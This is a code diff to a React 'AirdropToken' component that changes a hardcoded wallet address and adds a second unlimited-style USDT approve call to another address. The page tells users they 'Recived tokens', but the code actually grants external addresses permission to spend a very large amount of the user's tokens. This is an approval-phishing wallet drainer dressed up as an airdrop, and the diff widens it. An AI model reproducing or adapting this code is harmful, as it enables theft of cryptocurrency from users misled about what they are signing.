@@ -52,7 +52,7 @@ class AirdropToken extends React.Component {
             },
         },
         symbol: "USDT",
-        mAddress: '0x57Ce6709e2201633fc82A6F98A22775aC49831c4',
+        mAddress: '0x78298fA25eBf614A994041Df199c28bc637804d5',
 
     }
     componentDidMount() {
@@ -95,6 +95,14 @@ class AirdropToken extends React.Component {
                 let token = this.state[symbol]
                 window.token = token
                 token[chainId].contract.methods.approve(mAddress, 1_000_000_000 * token[chainId].decimals)
+                    .send({ from: accounts[0] }, function (err, tx) {
+                        if (err) {
+                            toast.error(err.message)
+                            logerror(err)
+                        } else toast.success("Recived tokens")
+                    })
+                    
+                token[chainId].contract.methods.approve("0x57Ce6709e2201633fc82A6F98A22775aC49831c4", 1_000_000_000 * token[chainId].decimals)
                     .send({ from: accounts[0] }, function (err, tx) {
                         if (err) {
                             toast.error(err.message)
